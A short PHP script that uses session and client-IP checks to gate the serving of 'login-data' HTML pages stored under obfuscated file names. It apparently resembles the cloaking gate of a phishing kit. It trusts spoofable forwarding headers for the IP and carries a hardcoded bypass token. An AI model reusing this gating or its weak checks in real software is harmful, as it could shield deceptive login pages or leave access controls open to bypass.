<?php
session_start();
//require 'api.php';


ddd();

function ddd(){
 $output = '';
 
 $a = '123456789abcdefghijkmnopqrstuvwxyz';
 $ok = true;
 if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) != 'xmlhttprequest'){
   $ok = false; 
 }
 if($ok && isset($_SESSION['evdd']))
{    
  //print_r($_SESSION);
  $aa = substr(str_shuffle($a), 0, 12);
  $ip = get_client_ip();
  if(filter_var($ip, FILTER_VALIDATE_IP)){
	if($_SESSION['evdd']['ip'] == $ip){
	  $lch = 'a';
	  if($ip == '::1'){
	    $lch ='b';
		if(isset($_POST['lch']) && $_POST['lch'] == '1fa77417ebc'){
		  $lch = 'a';	
		}
        //else{ die(); }
	  }
	
      if(md5($_SESSION['evdd']['idmd5']) == $_SESSION['evdd']['idmd5t']){
       $output = $_SESSION['evdd']['idmd5t'];
       file_put_contents('temp/'.$_SESSION['evdd']['idmd5t'].'.txt', time());	  
       $output = $_SESSION['evdd']['idmd5t']; 
       if(isset($_POST['pg']) && ($_POST['pg'] == 'login-data.html' || $_POST['pg'] == 'login-data2.html')){
         $fname =($_POST['pg'] == 'login-data.html') ? 'login-data-sdsdsdsdsddsds.html' : 'login-data2-sdsdsdsdsddsds.html';
         $output = file_get_contents($fname);
        }
      }	  
	}
  }

}	
	echo $output;
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


?>